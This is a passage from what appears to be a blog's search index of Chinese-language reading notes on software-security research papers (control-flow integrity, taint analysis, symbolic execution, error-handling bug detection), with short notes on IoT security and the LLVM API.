<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APISan: Sanitizing API Usages through Semantic Cross-checking</title>
    <url>/2021/07/16/apisan-sanitizing-api-usages-through-semantic-cross-checking/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
<ol>
<li>主要思路：学习已有的API使用模式，检测使用不当的API</li>
<li>缺陷：neither sound nor complete</li>
</ol>
<h2 id="Design"><a href="#Design" class="headerlink" title="Design"></a>Design</h2><ul>
<li>四种API上下文模式<ol>
<li>Return：返回值不仅仅返回计算结果，也可能表示当前的运算状态</li>
<li>Argument：函数的参数之间可能存在某种运算关系，例如memory copy 的size应该小于buffer的size</li>
<li>Causality：两个API之间可能存在因果关系，例如在请求锁之前应该释放锁</li>
<li>Conditions：条件关系，例如要验证一个账号的合法性，首先该账号得存在</li>
</ol>
</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{yun2016apisan,<br>  title={Apisan: Sanitizing ${$API$}$ usages through semantic cross-checking},<br>  author={Yun, Insu and Min, Changwoo and Si, Xujie and Jang, Yeongjin and Kim, Taesoo and Naik, Mayur},<br>  booktitle={25th ${$USENIX$}$ Security Symposium (${$USENIX$}$ Security 16)},<br>  pages={363--378},<br>  year={2016}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>Bug finding</tag>
      </tags>
  </entry>
  <entry>
    <title>Apex-Automated inference of error specifications for c apis</title>
    <url>/2021/07/14/apex-automated-inference-of-error-specifications-for-c-apis/</url>
    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><blockquote>
<p>文章速览</p>
<ol>
<li>主要目标:识别错误处理路径</li>
<li>核心idea:错误处理的路径相对于常规路径更加简单</li>
</ol>
</blockquote>
<h2 id="1-1-缺陷"><a href="#1-1-缺陷" class="headerlink" title="1.1. 缺陷"></a>1.1. 缺陷</h2><ol>
<li>受到数据集限制</li>
<li>文章的核心思路是假设错误路径与非错误路径不同,但是可能存在与其相悖的情况</li>
<li>文章的Bug finding依赖于人工判断</li>
</ol>
<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{kang2016apex,<br>  title={Apex: Automated inference of error specifications for c apis},<br>  author={Kang, Yuan and Ray, Baishakhi and Jana, Suman},<br>  booktitle={Proceedings of the 31st IEEE/ACM International Conference on Automated Software Engineering},<br>  pages={472--482},<br>  year={2016}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>All You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution</title>
    <url>/2021/07/13/all-you-ever-wanted-to-know-about-dynamic-taint-analysis-and-forward-symbolic-execution/</url>
    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><blockquote>
<p>文章速览：  </p>
<ol>
<li>构建了一种新的中间语言 </li>
<li>动态污点分析</li>
<li>符号执行</li>
</ol>
</blockquote>
<blockquote>
<p>重要观点：</p>
<ul>
<li>动态分析的优点<ol>
<li>结果准确</li>
<li>简单,只需考虑一次执行过程中发生的事情</li>
</ol>
</li>
<li>动态污点分析+符号执行的应用<ol>
<li>未知漏洞挖掘</li>
<li>自动化过滤输入</li>
<li>测试用例生成</li>
<li>恶意代码分析</li>
</ol>
</li>
</ul>
</blockquote>
<h2 id="1-1-动态污点分析"><a href="#1-1-动态污点分析" class="headerlink" title="1.1. 动态污点分析"></a>1.1. 动态污点分析</h2><blockquote>
<p>动态追踪source和sink</p>
</blockquote>
<ul>
<li>两个挑战:overtainted和undertainting</li>
<li>内容速览<ol>
<li>如何执行动态符号执行?<ul>
<li>根据操作语义的规则</li>
</ul>
</li>
<li>污点策略<ul>
<li>introduction</li>
<li>transport</li>
<li>check</li>
</ul>
</li>
<li>注意事项:哪些容易产生overtainted或undertainting?<ul>
<li>decide when to remove a taint is more difficult than when to introduce a taint</li>
<li>undertainting ?</li>
</ul>
</li>
</ol>
</li>
<li>重要观点: 不同目标应用的污点策略不同,但是大同小异</li>
</ul>
<h2 id="1-2-符号执行"><a href="#1-2-符号执行" class="headerlink" title="1.2. 符号执行"></a>1.2. 符号执行</h2><blockquote>
<p>一个公式对应一条路径</p>
</blockquote>
<ul>
<li>三个难题<ol>
<li>Symbolic Memory<ul>
<li>解决方案<ol>
<li>unsound assumptions<br> 将如下代码: <pre class="line-numbers language-none"><code class="language-none">store(addr1, v)
z = load(addr2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 作如下假设: <pre class="line-numbers language-none"><code class="language-none">mem_addr1 = v
z = mem_addr2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 即忽略addr1与addr2是否为别名</li>
<li>Let subsequent analysis steps deal with them.(滞后处理,比如之后再使用SMT判断二者是否存在别名关系)</li>
<li>别名分析</li>
</ol>
</li>
</ul>
</li>
<li>System calls<ul>
<li>解决方案:副作用建模(规则?比如说使用上一次的执行结果)</li>
</ul>
</li>
<li>Path Selection<br> 将路径看成树,主要是要防止循环的出现(设置执行上限)<ul>
<li>解决方案<ol>
<li>DFS</li>
<li>实际执行</li>
<li>随机路径</li>
<li>启发式 ?</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
<li>其它<ul>
<li>符号跳转(跳转表)<ul>
<li>解决方案<ol>
<li>实际执行</li>
<li>SMT</li>
<li>Static Analysis(作者认为效果最优)</li>
</ol>
</li>
</ul>
</li>
<li>分析效果:三个指数     <img src="/2021/07/13/all-you-ever-wanted-to-know-about-dynamic-taint-analysis-and-forward-symbolic-execution/%E4%B8%89%E4%B8%AA%E6%8C%87%E6%95%B0.png" class="" title="样例代码">  
<ol>
<li>执行时间是程序分支数目的指数级</li>
<li>指数数量的formula</li>
<li>指数规模的formula size:例如x→s+s+s+s....+s</li>
</ol>
<ul>
<li>解决方案:<ol>
<li>硬件加速</li>
<li>简化约束</li>
<li>调整符号名→unique</li>
<li>分步求解</li>
<li>weak precondition?</li>
</ol>
</li>
</ul>
</li>
<li>Mixed Execution:对于某些可信输入,不符号化</li>
</ul>
</li>
</ul>
<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{schwartz2010all,<br>  title={All you ever wanted to know about dynamic taint analysis and forward symbolic execution (but might have been afraid to ask)},<br>  author={Schwartz, Edward J and Avgerinos, Thanassis and Brumley, David},<br>  booktitle={2010 IEEE symposium on Security and privacy},<br>  pages={317--331},<br>  year={2010},<br>  organization={IEEE}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>符号执行</tag>
        <tag>动态污点分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Automatically Detecting Error Handling Bugs Using Error Specifications</title>
    <url>/2021/07/13/automatically-detecting-error-handling-bugs-using-error-specifications/</url>
    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><h2 id="1-1-论文目标"><a href="#1-1-论文目标" class="headerlink" title="1.1. 论文目标"></a>1.1. 论文目标</h2><p>检测<strong>C程序</strong>中不当错误处理导致的Bug</p>
<h2 id="1-2-关键问题与解决方法"><a href="#1-2-关键问题与解决方法" class="headerlink" title="1.2. 关键问题与解决方法"></a>1.2. 关键问题与解决方法</h2><ol>
<li>识别错误路径<ul>
<li>归纳错误模式→错误返回代码</li>
</ul>
</li>
<li>归纳错误处理方法<ul>
<li>upstream return</li>
<li>exit</li>
<li>log</li>
</ul>
</li>
<li>定位BUG位置<ul>
<li>交叉检查，只能确定是否报告漏洞，但是不知道如何报告漏洞</li>
</ul>
</li>
</ol>
<h2 id="1-4-Future-work"><a href="#1-4-Future-work" class="headerlink" title="1.4. Future work"></a>1.4. Future work</h2><ol>
<li>自动识别错误处理模式</li>
<li>自动生成Bug补丁</li>
</ol>
<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><h2 id="2-1-BibTex"><a href="#2-1-BibTex" class="headerlink" title="2.1. BibTex"></a>2.1. BibTex</h2><p>@inproceedings{jana2016automatically,<br>  title={Automatically detecting error handling bugs using error specifications},<br>  author={Jana, Suman and Kang, Yuan Jochen and Roth, Samuel and Ray, Baishakhi},<br>  booktitle={25th ${$USENIX$}$ Security Symposium (${$USENIX$}$ Security 16)},<br>  pages={345--362},<br>  year={2016}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>bug detect</tag>
        <tag>error hanlde</tag>
        <tag>static analysis</tag>
        <tag>usenix</tag>
      </tags>
  </entry>
  <entry>
    <title>Control-Flow Bending: On the Effectiveness of Control-Flow Integrity</title>
    <url>/2021/07/30/control-flow-bending-on-the-effectiveness-of-control-flow-integrity/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h2 id="引用和知识"><a href="#引用和知识" class="headerlink" title="引用和知识"></a>引用和知识</h2><pre class="line-numbers language-none"><code class="language-none">CFI,in it's best form,can not stop all attacks.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">When no shadow stack is in place, dispatcher functions allow powerful attacks. Consequently
CFI without return instruction integrity is not secure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="思考与讨论"><a href="#思考与讨论" class="headerlink" title="思考与讨论"></a>思考与讨论</h2><ul>
<li>能否在每次压入返回地址的时候对返回地址进行保护？<ul>
<li>目前的保护方式有canary和shadow stack</li>
<li>比如说以某个值为key，然后对return address进行加密，存放再canary的地方<ul>
<li>缺陷：执行效率比较慢，每次函数返回都要进行两次加密计算→挑选合适的加密算法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{carlini2015control,
  title={Control-flow bending: On the effectiveness of control-flow integrity},
  author={Carlini, Nicholas and Barresi, Antonio and Payer, Mathias and Wagner, David and Gross, Thomas R},
  booktitle={24th $\{$USENIX$\}$ Security Symposium ($\{$USENIX$\}$ Security 15)},
  pages={161--176},
  year={2015}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>Chopped Symbolic Execution</title>
    <url>/2021/07/16/chopped-symbolic-execution/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{trabish2018chopped,<br>  title={Chopped symbolic execution},<br>  author={Trabish, David and Mattavelli, Andrea and Rinetzky, Noam and Cadar, Cristian},<br>  booktitle={Proceedings of the 40th International Conference on Software Engineering},<br>  pages={350--360},<br>  year={2018}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>Control-Flow Integrity: Precision, Security, and Performance</title>
    <url>/2021/07/16/control-flow-integrity-precision-security-and-performance/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
<ol>
<li>主题：评估CFI的安全性能和运行性能</li>
</ol>
<h1 id="核心内容"><a href="#核心内容" class="headerlink" title="核心内容"></a>核心内容</h1><ol>
<li>classification of static analysis which used to pre-determine foward indirect control-flow    <img src="/2021/07/16/control-flow-integrity-precision-security-and-performance/classificationOfSAP.png" class=""> </li>
<li>认为AIR不足以反应CFI的安全性能，提出了一种新的安全评价指标 EC/LC</li>
</ol>
<h2 id="启发"><a href="#启发" class="headerlink" title="启发"></a>启发</h2><ol>
<li>本文的评估方法可以作为论文的实验方法</li>
<li>该论文对CFI做了综述，实际上也是对非直接调用的识别做综述</li>
</ol>
<h2 id="Future-work"><a href="#Future-work" class="headerlink" title="Future work"></a>Future work</h2><ol>
<li>未来的CFI需要基于流敏感和上下文敏感</li>
</ol>
<h2 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h2><ul>
<li>Average Indirect target Reduction (AIR) ——Zhang and Sekar 2013<br>So far, the only existing quantitative measure of the security of a CFI implementation is Average Indirect Target Reduction (AIR).</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@article{burow2017control,<br>  title={Control-flow integrity: Precision, security, and performance},<br>  author={Burow, Nathan and Carr, Scott A and Nash, Joseph and Larsen, Per and Franz, Michael and Brunthaler, Stefan and Payer, Mathias},<br>  journal={ACM Computing Surveys (CSUR)},<br>  volume={50},<br>  number={1},<br>  pages={1--33},<br>  year={2017},<br>  publisher={ACM New York, NY, USA}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>Control Flow Integrity for COTS Binaries</title>
    <url>/2021/07/30/control-flow-integrity-for-cots-binaries/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h2 id="引用和知识"><a href="#引用和知识" class="headerlink" title="引用和知识"></a>引用和知识</h2><pre class="line-numbers language-none"><code class="language-none">Previous implementations of CFI have required
compiler support or the presence of relocation or debug
information in the binary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{zhang2013control,
  title={Control flow integrity for $\{$COTS$\}$ binaries},
  author={Zhang, Mingwei and Sekar, R},
  booktitle={22nd $\{$USENIX$\}$ Security Symposium ($\{$USENIX$\}$ Security 13)},
  pages={337--352},
  year={2013}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>Cross-Checking Semantic Correctness: The Case of Finding File System Bugs</title>
    <url>/2021/07/16/cross-checking-semantic-correctness-the-case-of-finding-file-system-bugs/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
<ol>
<li>主题：Find high-level semantics bugs</li>
<li>核心思路：cross checking   <ol>
<li>multiple existing implemetations may obey implicit high-level semantics<br>对于类似操作，其不同实现在语义上应该是相似的</li>
</ol>
</li>
<li>limitations<ol>
<li>neither sound nor complete</li>
</ol>
</li>
</ol>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{min2015cross,<br>  title={Cross-checking semantic correctness: The case of finding file system bugs},<br>  author={Min, Changwoo and Kashyap, Sanidhya and Lee, Byoungyoung and Song, Chengyu and Kim, Taesoo},<br>  booktitle={Proceedings of the 25th Symposium on Operating Systems Principles},<br>  pages={361--377},<br>  year={2015}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>Bug finding</tag>
      </tags>
  </entry>
  <entry>
    <title>Fine-grained control-flow integrity for kernel software</title>
    <url>/2021/08/07/fine-grained-control-flow-integrity-for-kernel-software/</url>
    <content><![CDATA[<h1 id="1-阅读记录"><a href="#1-阅读记录" class="headerlink" title="1. 阅读记录"></a>1. 阅读记录</h1><p>本文主要是针对内核提出了一种细粒度的CFI。</p>
<h2 id="1-1-Compute-CFG"><a href="#1-1-Compute-CFG" class="headerlink" title="1.1. Compute CFG"></a>1.1. Compute CFG</h2><h3 id="1-1-1-Compute-Indirect-Call-Targets"><a href="#1-1-1-Compute-Indirect-Call-Targets" class="headerlink" title="1.1.1. Compute Indirect Call Targets"></a>1.1.1. Compute Indirect Call Targets</h3><p>在计算indirect call targets方面，本文主要使用的是静态污点分析的方法。本文对函数指针的使用做了两个假设(对于两个假设的合理性，本文进行了补充说明)：</p>
<ul>
<li>函数指针的唯一运算操作是赋值<ul>
<li>原文：We believe arbitrary computations on function pointers are unlikely due to considerations such as readability, maintainability, and portability<br>即本文认为考虑到程序的可读性、可维护性、可移植性等要素，不应该对函数指针做复杂的运算操作</li>
</ul>
</li>
<li>不会有数据指针指向函数指针</li>
</ul>
<p>关于污点分析的实现，本文选择污染所有被函数f的函数指针，然后对其进行传播，最后的结果形式为f-&gt;set(fptr)</p>
<p>另外，本文对type analysis做出了评价，认为其既会导致误报也会导致漏报：</p>
<ul>
<li>误报：无关的目标拥有和函数指针相同的签名</li>
<li>漏报：签名不同的函数被强行赋值给了某函数指针</li>
</ul>
<h3 id="1-1-2-Compute-Return-Targets"><a href="#1-1-2-Compute-Return-Targets" class="headerlink" title="1.1.2. Compute Return Targets"></a>1.1.2. Compute Return Targets</h3><p>结果形式：call sites→set(return instructions)</p>
<p>主要难点：汇编代码</p>
<p>算法思路：递归</p>
<h2 id="1-2-Enforce-CFI"><a href="#1-2-Enforce-CFI" class="headerlink" title="1.2. Enforce CFI"></a>1.2. Enforce CFI</h2><h3 id="1-2-1-Enforcement-Policy"><a href="#1-2-1-Enforcement-Policy" class="headerlink" title="1.2.1. Enforcement Policy"></a>1.2.1. Enforcement Policy</h3><img src="/2021/08/07/fine-grained-control-flow-integrity-for-kernel-software/CFI%E5%8A%A0%E5%9B%BA%E7%AD%96%E7%95%A5.jpg" class="">

<p>关于s4的解释，主要是防止在内核返回用户态的时候被修改返回地址，劫持控制流。因为在状态切换的时候，代码的执行范围已经超出了内核的CFG，CFI将不会再对其进行检查。</p>
<h3 id="1-2-2-Performance-Overhead"><a href="#1-2-2-Performance-Overhead" class="headerlink" title="1.2.2. Performance Overhead"></a>1.2.2. Performance Overhead</h3><p>在提高CFI效率方面，本文主要使用了两种方法：</p>
<ul>
<li>复用程序中已有的check instruction</li>
<li>将indirect call转化成direct call<ul>
<li>本文认为，某些非直接调用只是为了表现代码的灵活性，实际上它的调用目标只有1个，可以使用静态分析的方法找出这唯一的调用目标，从而将indirect call转变成direct call，以减小CFI的开销。<br>原文:in many cases kernel software only uses one target for indirect control transfers</li>
</ul>
</li>
</ul>
<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{ge2016fine,<br>  title={Fine-grained control-flow integrity for kernel software},<br>  author={Ge, Xinyang and Talele, Nirupama and Payer, Mathias and Jaeger, Trent},<br>  booktitle={2016 IEEE European Symposium on Security and Privacy (EuroS&amp;P)},<br>  pages={179--194},<br>  year={2016},<br>  organization={IEEE}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>Counterfeit Object-Oriented Programming: On the Difficulty of Preventing Code Reuse Attacks in C++ Applications</title>
    <url>/2021/08/01/counterfeit-object-oriented-programming-on-the-difficulty-of-preventing-code-reuse-attacks-in-c-applications/</url>
    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><blockquote>
<p>文章速览:COOP</p>
</blockquote>
<p>绕过CFI执行函数的方法：</p>
<img src="/2021/08/01/counterfeit-object-oriented-programming-on-the-difficulty-of-preventing-code-reuse-attacks-in-c-applications/%E7%BB%95%E8%BF%87CFI%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95.png" class="">
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{schuster2015counterfeit,<br>  title={Counterfeit object-oriented programming: On the difficulty of preventing code reuse attacks in C++ applications},<br>  author={Schuster, Felix and Tendyck, Thomas and Liebchen, Christopher and Davi, Lucas and Sadeghi, Ahmad-Reza and Holz, Thorsten},<br>  booktitle={2015 IEEE Symposium on Security and Privacy},<br>  pages={745--762},<br>  year={2015},<br>  organization={IEEE}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
        <tag>S&amp;P</tag>
        <tag>attack</tag>
        <tag>COOP</tag>
      </tags>
  </entry>
  <entry>
    <title>Enforcing Forward-Edge Control-Flow Integrity in GCC &amp; LLVM</title>
    <url>/2021/07/29/enforcing-forward-edge-control-flow-integrity-in-gcc-llvm/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><blockquote>
<p>文章速览<br>贡献：    </p>
<ol>
<li>VTV</li>
<li>find forward-edge control-flow vulnerabilities</li>
</ol>
</blockquote>
<h2 id="观点或知识"><a href="#观点或知识" class="headerlink" title="观点或知识"></a>观点或知识</h2><pre class="line-numbers language-none"><code class="language-none">most indirect calls in C++ are virtual calls (e.g., 91.8% in Chrome)
所以在c++(或者说其它的面向对象语言)中，动态特性可以用来检测bug，将crix中C语言的漏洞模式转化到C++中！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">vtable是放在read-only区域的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><ul>
<li>它的VTV(VTable Vertification)是如何实现的？<br>  在虚调用发生前判断调用方法是都在合法的集合中。<br>  从方法论上来说，它应该没有任何创新，仍然使用CHA那一套。本文最大的贡献就是它真正地将CFI应用到了工业界中去。</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{tice2014enforcing,
  title={Enforcing forward-edge control-flow integrity in $\{$GCC$\}$ \&amp; $\{$LLVM$\}$},
  author={Tice, Caroline and Roeder, Tom and Collingbourne, Peter and Checkoway, Stephen and Erlingsson, {\'U}lfar and Lozano, Luis and Pike, Geoff},
  booktitle={23rd $\{$USENIX$\}$ Security Symposium ($\{$USENIX$\}$ Security 14)},
  pages={941--955},
  year={2014}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>Hector: Detecting Resource-Release Omission Faults in Error-Handling Code for Systems Software</title>
    <url>/2021/07/15/hector-detecting-resource-release-omission-faults-in-error-handling-code-for-systems-software/</url>
    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><blockquote>
<p>文章速览:</p>
<ol>
<li>目标:检测资源未释放导致的错误</li>
<li>方法:根据已有错误处理判断其它错误处理代码是否正确</li>
<li>Future work:<ol>
<li>若代码中本不存在错误处理则无法使用本方法</li>
<li>自动修复错误</li>
<li>用该方法检测其它类型的错误</li>
</ol>
</li>
</ol>
</blockquote>
<h2 id="1-1-疑问"><a href="#1-1-疑问" class="headerlink" title="1.1. 疑问"></a>1.1. 疑问</h2><ul>
<li>什么是specification mining?规则匹配?</li>
</ul>
<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{saha2013hector,<br>  title={Hector: Detecting resource-release omission faults in error-handling code for systems software},<br>  author={Saha, Suman and Lozi, Jean-Pierre and Thomas, Ga{"e}l and Lawall, Julia L and Muller, Gilles},<br>  booktitle={2013 43rd Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN)},<br>  pages={1--12},<br>  year={2013},<br>  organization={IEEE}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>bug detect</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全</title>
    <url>/2021/07/19/iot-an-quan/</url>
    <content><![CDATA[<h1 id="IoT发展趋势"><a href="#IoT发展趋势" class="headerlink" title="IoT发展趋势"></a>IoT发展趋势</h1><p>特点：</p>
<ol>
<li>前景广阔</li>
<li>工业领域应用较多</li>
<li>IoT设备中摄像头、路由器数量占一半以上，受攻击概率更大</li>
<li>分布于各行各业</li>
</ol>
<h1 id="物联网终端"><a href="#物联网终端" class="headerlink" title="物联网终端"></a>物联网终端</h1><h2 id="作用与分类"><a href="#作用与分类" class="headerlink" title="作用与分类"></a>作用与分类</h2><ul>
<li>作用<ol>
<li>物理信息→数据信息(采集、识别、控制)</li>
<li>终端将数据传输到决策服务端，服务端反馈指令给终端接收</li>
</ol>
</li>
<li>分类</li>
</ul>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><h1 id="IoT安全"><a href="#IoT安全" class="headerlink" title="IoT安全"></a>IoT安全</h1><h2 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h2><p>特点：</p>
<ol>
<li>设备小，数量多，影响大</li>
</ol>
<h2 id="保障体系"><a href="#保障体系" class="headerlink" title="保障体系"></a>保障体系</h2><p>全面检测与态势感知</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul>
<li>态势感知？<br>  在大规模网络环境中对能够引起网络态势发生变化的安全要素进行获取、理解、显示以及最近发展趋势的顺延性预测，而最终的目的是要进行决策与行动</li>
</ul>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
  </entry>
  <entry>
    <title>KLEE: Unassisted and Automatic Generation of High-Coverage Tests for Complex Systems Programs</title>
    <url>/2021/07/13/klee-unassisted-and-automatic-generation-of-high-coverage-tests-for-complex-systems-programs/</url>
    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1>]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>符号执行</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM</title>
    <url>/2021/05/13/llvm/</url>
    <content><![CDATA[<h1 id="各类Pass"><a href="#各类Pass" class="headerlink" title="各类Pass"></a>各类Pass</h1><ul>
<li>ModulePass 以整个程序作为输入单元</li>
<li>FunctionPass  对函数进行操作</li>
</ul>
<h1 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h1><h2 id="宏定义中的函数调用"><a href="#宏定义中的函数调用" class="headerlink" title="宏定义中的函数调用"></a>宏定义中的函数调用</h2><p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">#define MACRO_FUNC(a) func(a);
void func(int a){a = 1;}

int main(){
    int b = 0;
    MACRO_FUNC(b);
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><h2 id="uses和user方法的区别？"><a href="#uses和user方法的区别？" class="headerlink" title="uses和user方法的区别？"></a>uses和user方法的区别？</h2><h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><blockquote>
<p>函数层API</p>
</blockquote>
<h3 id="methods"><a href="#methods" class="headerlink" title="methods"></a>methods</h3><ul>
<li>isIntrinsic 判断函数是否为llvm内置函数，即函数名以"llvm."开头</li>
<li>isDeclaration 判断该函数是否已经被定义，如果已经被定义返回True</li>
</ul>
<h2 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h2><blockquote>
<p>指令类</p>
</blockquote>
<h3 id="methods-1"><a href="#methods-1" class="headerlink" title="methods"></a>methods</h3><ul>
<li><p>getMetadata<br>  Example：</p>
<pre><code class="C">getMetadata("dbg")     //如果编译的时候保留了DEBUG信息，可以通过这个方法，获取和这条指令相关的DEBUG信息
//返回MDNode(Metadata Node)类对象

//demo
DILocation *getSourceLocation(Instruction *I) {
if (!I)
    return NULL;

MDNode *N = I-&gt;getMetadata("dbg");
if (!N)
    return NULL;

DILocation *Loc = dyn_cast&lt;DILocation&gt;(N);
if (!Loc || Loc-&gt;getLine() &lt; 1)
        return NULL;

    return Loc;
}
</code></pre>
</li>
</ul>
<h3 id="subclass"><a href="#subclass" class="headerlink" title="subclass"></a>subclass</h3><ul>
<li>CmpInst<ul>
<li>ICmpInst</li>
<li>FCmpInst</li>
</ul>
</li>
<li>CallBase 所有调用指令的基类</li>
</ul>
<h2 id="DILocation"><a href="#DILocation" class="headerlink" title="DILocation"></a>DILocation</h2><blockquote>
<p>DEBUG Locatiion</p>
</blockquote>
<h3 id="methods-2"><a href="#methods-2" class="headerlink" title="methods"></a>methods</h3><ul>
<li>getLine<br>  获取需要DEBUG的代码所在的行数</li>
<li>getFileName<br>  获取需要DEBUG的代码所在的文件</li>
</ul>
<h1 id="icall收集中遇到的问题"><a href="#icall收集中遇到的问题" class="headerlink" title="icall收集中遇到的问题"></a>icall收集中遇到的问题</h1><ul>
<li>有些Address-Taken Func可能就是在直接调用中被调用的，并不会成为非直接调用的目标<img src="/2021/05/13/llvm/icall%E9%97%AE%E9%A2%981.png" class=""> </li>
</ul>
]]></content>
      <categories>
        <category>静态分析</category>
        <category>LLVM学习笔记</category>
      </categories>
  </entry>
  <entry>
